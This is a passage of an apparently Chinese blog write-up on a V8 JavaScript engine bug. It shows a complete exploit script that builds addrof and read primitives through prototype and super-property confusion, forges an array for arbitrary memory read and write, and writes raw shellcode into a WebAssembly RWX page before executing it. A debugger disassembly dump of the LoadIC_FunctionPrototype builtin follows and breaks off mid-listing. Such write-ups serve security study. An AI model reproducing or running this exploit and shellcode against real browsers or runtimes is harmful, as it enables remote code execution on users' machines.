class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">		A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto;</span><br><span class="line">		proto.<span class="property">length</span>;</span><br><span class="line">		<span class="keyword">var</span> l = a.<span class="title function_">m</span>();</span><br><span class="line">		<span class="keyword">return</span> l;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">let</span> length = <span class="title function_">f</span>();</span><br><span class="line">		<span class="keyword">if</span>(length != <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">		a.<span class="property">length</span> = (addr - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">let</span> l = <span class="title function_">f</span>();</span><br><span class="line">		a.<span class="property">length</span> = (addr - <span class="number">8</span> + <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">let</span> h = <span class="title function_">f</span>();</span><br><span class="line">		<span class="keyword">return</span> ((h &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xff000000</span>) + (l &gt;&gt; <span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">		o[<span class="number">0</span>] = obj;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_">read</span>(elements_ptr + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> [read,addrof];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> [read,addrof] = <span class="title function_">get_read_and_addrof</span>(o,elements_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>,<span class="number">7.7</span>,<span class="number">8.8</span>,<span class="number">9.9</span>,<span class="number">10.0</span>];</span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> da = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_fake_arr_obj</span>(<span class="params">double_array</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> double_array_addr = <span class="title function_">addrof</span>(double_array);</span><br><span class="line">	<span class="keyword">var</span> double_array_map = <span class="title function_">read</span>(double_array_addr);</span><br><span class="line">	<span class="keyword">var</span> double_array_elements_addr = <span class="title function_">read</span>(double_array_addr + <span class="number">0x8</span>) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">var</span> double_array_elements_map = <span class="title function_">read</span>(double_array_elements_addr);</span><br><span class="line">	<span class="keyword">var</span> double_array_map_map = <span class="title function_">read</span>(double_array_map - <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">var</span> fake_length = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_addr&quot;</span>,double_array_addr);</span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_map&quot;</span>,double_array_map);</span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_elements_addr&quot;</span>,double_array_elements_addr);</span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_elements_map&quot;</span>,double_array_elements_map);</span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_map_map&quot;</span>,double_array_map_map);</span><br><span class="line"></span><br><span class="line">	double_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(double_array_map_map) &lt;&lt; <span class="number">8n</span>); </span><br><span class="line">	double_array[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">	double_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(double_array_elements_addr + <span class="number">0x21</span>) &lt;&lt; <span class="number">8n</span>); </span><br><span class="line">	double_array[<span class="number">3</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(double_array_map)); </span><br><span class="line">	double_array[<span class="number">4</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(fake_length) &lt;&lt; <span class="number">32n</span> | <span class="title class_">BigInt</span>(double_array_elements_addr + <span class="number">0x31</span>));</span><br><span class="line">	double_array[<span class="number">5</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(fake_length) &lt;&lt; <span class="number">32n</span> | <span class="title class_">BigInt</span>(double_array_elements_map));</span><br><span class="line">	double_array[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span>&#123;</span><br><span class="line">		<span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="variable language_">super</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x0</span> = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x1</span> = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x2</span> = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x3</span> = (double_array_elements_addr + <span class="number">0x8</span> + <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_">m</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> proto = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line">		B.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto;</span><br><span class="line">		proto.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">		<span class="keyword">return</span> b.<span class="title function_">m</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">var</span> fake_obj = <span class="title function_">f</span>();</span><br><span class="line">		<span class="keyword">if</span>(fake_obj.<span class="property">length</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> fake_obj;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arr_obj = <span class="title function_">get_fake_arr_obj</span>(double_array);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	fake_arr_obj[<span class="number">0x11</span>] = <span class="title function_">i2f</span>((<span class="number">4n</span> &lt;&lt; <span class="number">32n</span>) | (<span class="title class_">BigInt</span>(addr - <span class="number">0x7</span>)));</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2i</span>(da[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line">	fake_arr_obj[<span class="number">0x11</span>] = <span class="title function_">i2f</span>((<span class="number">4n</span> &lt;&lt; <span class="number">32n</span>) | (<span class="title class_">BigInt</span>(addr - <span class="number">0x7</span>)));</span><br><span class="line">	da[<span class="number">0</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_read</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> high_addr = addr &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">	<span class="keyword">var</span> low_addr = addr &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">	fake_arr_obj[<span class="number">8</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(low_addr) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">	fake_arr_obj[<span class="number">9</span>] = <span class="title function_">i2f</span>(((<span class="title function_">f2i</span>(fake_arr_obj[<span class="number">9</span>]) &gt;&gt; <span class="number">32n</span>) &lt;&lt; <span class="number">32n</span>) | <span class="title class_">BigInt</span>(high_addr));</span><br><span class="line">	<span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab); </span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2i</span>(dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>,<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_write</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> high_addr = addr &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">	<span class="keyword">var</span> low_addr = addr &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">	fake_arr_obj[<span class="number">8</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(low_addr) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">	fake_arr_obj[<span class="number">9</span>] = <span class="title function_">i2f</span>(((<span class="title function_">f2i</span>(fake_arr_obj[<span class="number">9</span>]) &gt;&gt; <span class="number">32n</span>) &lt;&lt; <span class="number">32n</span>) | <span class="title class_">BigInt</span>(high_addr));</span><br><span class="line">  <span class="keyword">let</span> ua = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(ab); </span><br><span class="line">  ua.<span class="title function_">set</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = <span class="title function_">addrof</span>(wasmInstance);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;wasm_instance_addr&quot;</span>,wasm_instance_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title function_">read64</span>(wasm_instance_addr + <span class="number">0x68</span>);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;rwx_page_addr&quot;</span>,rwx_page_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sc = [<span class="number">72</span>, <span class="number">49</span>, <span class="number">201</span>, <span class="number">72</span>, <span class="number">129</span>, <span class="number">233</span>, <span class="number">247</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">239</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">187</span>, <span class="number">124</span>, <span class="number">199</span>, <span class="number">145</span>, <span class="number">218</span>, <span class="number">201</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">93</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">88</span>, <span class="number">39</span>, <span class="number">72</span>, <span class="number">45</span>, <span class="number">248</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">226</span>, <span class="number">244</span>, <span class="number">22</span>, <span class="number">252</span>, <span class="number">201</span>, <span class="number">67</span>, <span class="number">129</span>, <span class="number">1</span>, <span class="number">128</span>, <span class="number">63</span>, <span class="number">21</span>, <span class="number">169</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">161</span>, <span class="number">186</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">245</span>, <span class="number">32</span>, <span class="number">249</span>, <span class="number">247</span>, <span class="number">170</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">21</span>, <span class="number">245</span>, <span class="number">33</span>, <span class="number">195</span>, <span class="number">50</span>, <span class="number">211</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">93</span>, <span class="number">25</span>, <span class="number">191</span>, <span class="number">225</span>, <span class="number">181</span>, <span class="number">187</span>, <span class="number">206</span>, <span class="number">143</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">148</span>, <span class="number">193</span>, <span class="number">150</span>, <span class="number">136</span>, <span class="number">227</span>, <span class="number">146</span>, <span class="number">103</span>, <span class="number">76</span>, <span class="number">233</span>, <span class="number">161</span>, <span class="number">225</span>, <span class="number">177</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">49</span>, <span class="number">31</span>, <span class="number">199</span>, <span class="number">199</span>, <span class="number">141</span>, <span class="number">129</span>, <span class="number">51</span>, <span class="number">73</span>, <span class="number">82</span>, <span class="number">121</span>, <span class="number">199</span>, <span class="number">145</span>, <span class="number">218</span>, <span class="number">201</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">93</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span> / <span class="number">8</span>; i++ )&#123;</span><br><span class="line">    <span class="title function_">arb_write</span>(rwx_page_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span> ,sc.<span class="title function_">slice</span>(i * <span class="number">8</span>,(i + <span class="number">1</span>) * <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<h1 id="其他七七八八的内容"><a href="#其他七七八八的内容" class="headerlink" title="其他七七八八的内容"></a>其他七七八八的内容</h1><h2 id="LoadIC-FunctionPrototype的code"><a href="#LoadIC-FunctionPrototype的code" class="headerlink" title="LoadIC_FunctionPrototype的code"></a>LoadIC_FunctionPrototype的code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br></pre></td><td class="code"><pre><span class="line">gef➤  job <span class="number">0x00002b71080e33d9</span></span><br><span class="line"><span class="number">0x2b71080e33d9</span>: [Code] in ReadOnlySpace</span><br><span class="line"> - map: <span class="number">0x2b7108042621</span> &lt;Map&gt;</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = LoadIC_FunctionPrototype</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = <span class="number">0x2b71080e33d9</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Trampoline</span> (size = <span class="number">4</span>)</span><br><span class="line"><span class="number">0x2b71080e3418</span>     <span class="number">0</span>  cc             int3l</span><br><span class="line"><span class="number">0x2b71080e3419</span>     <span class="number">1</span>  cc             int3l</span><br><span class="line"><span class="number">0x2b71080e341a</span>     <span class="number">2</span>  cc             int3l</span><br><span class="line"><span class="number">0x2b71080e341b</span>     <span class="number">3</span>  cc             int3l</span><br><span class="line"></span><br><span class="line"><span class="built_in">Instructions</span> (size = <span class="number">1220</span>)</span><br><span class="line"><span class="number">0x7fdaddccee60</span>     <span class="number">0</span>  <span class="number">55</span>             push rbp</span><br><span class="line"><span class="number">0x7fdaddccee61</span>     <span class="number">1</span>  <span class="number">4889e5</span>         REX.W movq rbp,rsp</span><br><span class="line"><span class="number">0x7fdaddccee64</span>     <span class="number">4</span>  <span class="number">6</span>a1c           push <span class="number">0x1c</span></span><br><span class="line"><span class="number">0x7fdaddccee66</span>     <span class="number">6</span>  <span class="number">4883</span>ec38       REX.W subq rsp,<span class="number">0x38</span></span><br><span class="line"><span class="number">0x7fdaddccee6a</span>     a  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccee6d</span>     d  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccee71</span>    <span class="number">11</span>  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccee75</span>    <span class="number">15</span>  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccee79</span>    <span class="number">19</span>  <span class="number">488955f</span>0       REX.W movq [rbp<span class="number">-0x10</span>],rdx</span><br><span class="line"><span class="number">0x7fdaddccee7d</span>    <span class="number">1</span>d  <span class="number">488975</span>d0       REX.W movq [rbp<span class="number">-0x30</span>],rsi</span><br><span class="line"><span class="number">0x7fdaddccee81</span>    <span class="number">21</span>  <span class="number">48895</span>dd8       REX.W movq [rbp<span class="number">-0x28</span>],rbx</span><br><span class="line"><span class="number">0x7fdaddccee85</span>    <span class="number">25</span>  <span class="number">488945e0</span>       REX.W movq [rbp<span class="number">-0x20</span>],rax</span><br><span class="line"><span class="number">0x7fdaddccee89</span>    <span class="number">29</span>  <span class="number">48894</span>de8       REX.W movq [rbp<span class="number">-0x18</span>],rcx</span><br><span class="line"><span class="number">0x7fdaddccee8d</span>    <span class="number">2</span>d  <span class="number">488b</span>fa         REX.W movq rdi,rdx</span><br><span class="line"><span class="number">0x7fdaddccee90</span>    <span class="number">30</span>  <span class="number">4</span>c8bc6         REX.W movq r8,rsi</span><br><span class="line"><span class="number">0x7fdaddccee93</span>    <span class="number">33</span>  be8c000000     movl rsi,<span class="number">0x8c</span></span><br><span class="line"><span class="number">0x7fdaddccee98</span>    <span class="number">38</span>  <span class="number">4</span>c8bca         REX.W movq r9,rdx</span><br><span class="line"><span class="number">0x7fdaddccee9b</span>    <span class="number">3b</span>  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddcceea2</span>    <span class="number">42</span>  <span class="number">8b</span>92f7090000   movl rdx,[rdx+<span class="number">0x9f7</span>]</span><br><span class="line"><span class="number">0x7fdaddcceea8</span>    <span class="number">48</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddcceeab</span>    <span class="number">4b</span>  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddcceeb2</span>    <span class="number">52</span>  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddcceeb6</span>    <span class="number">56</span>  <span class="number">7401</span>           jz <span class="number">0x7fdaddcceeb9</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddcceeb8</span>    <span class="number">58</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddcceeb9</span>    <span class="number">59</span>  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddcceec0</span>    <span class="number">60</span>  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddcceec4</span>    <span class="number">64</span>  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddcceec8</span>    <span class="number">68</span>  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddcceeca</span>    <span class="number">6</span>a  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddcceed2</span>    <span class="number">72</span>  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span 